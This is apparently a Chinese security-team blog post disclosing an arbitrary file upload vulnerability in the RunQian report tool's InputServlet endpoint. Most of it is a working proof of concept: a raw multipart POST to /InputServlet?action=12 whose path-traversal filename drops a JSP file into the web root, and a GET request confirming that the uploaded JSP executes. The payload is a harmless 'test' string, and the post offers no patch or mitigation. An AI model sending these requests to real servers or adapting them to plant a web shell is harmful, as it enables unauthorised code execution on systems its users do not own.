#  润乾报表InputServlet接口存在任意文件上传漏洞   
原创 R0seK1ller  蟹堡安全团队   2024-08-04 20:27  
  
# 1. 漏洞描述  
  
  
    润乾报表是一个纯JAVA的企业级报表工具，支持对J2EE系统的嵌入式部署，无缝集成。服务器端支持各种常见的操作系统，支持各种常见的关系数据库和各类J2 EE的应用服务器，客户端采用标准纯html方式展现，支持ie和netscape， 润乾报表是领先的企业级报表分析软件。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zWrFTFHpA6V6uC9KEmlEAqk29AkQPbtib10CGiaUek83SkSAPVIfMFoibnqJSy0VVfehveEet6Kdm96g/640?wx_fmt=png&from=appmsg "")  
## 2. 漏洞复现  
```
POST /InputServlet?action=12 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Content-Type: multipart/form-data; boundary=00contentOboundary00
Connection: close
Content-Length: 238

--00contentOboundary00
Content-Disposition: form-data; name="upsize"

1024
--00contentOboundary00
Content-Disposition: form-data; name="file"; filename="/\..\\..\\..\12.jsp"
Content-Type: image/jpeg

test
--00contentOboundary00--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zWrFTFHpA6V6uC9KEmlEAqkgkknC63fB2r4g031ZDVEc50t5icIGqmq2tRKfF2n480FtCxbcYUrysw/640?wx_fmt=png&from=appmsg "")  
  
    拼接路径，尝试访问上传文件"12.jsp"，查看文件是否上传成功，文件是否能够解析。  
```
GET /12.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Connection: close

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zWrFTFHpA6V6uC9KEmlEAqk6x8mMFpAibZ8YWMibyEJ4T0S1gBT6SriclRDA3lOicAF5bavSpRWY6ONcA/640?wx_fmt=png&from=appmsg "")  
  
可以看到文件成功解析，打印出test。  
  
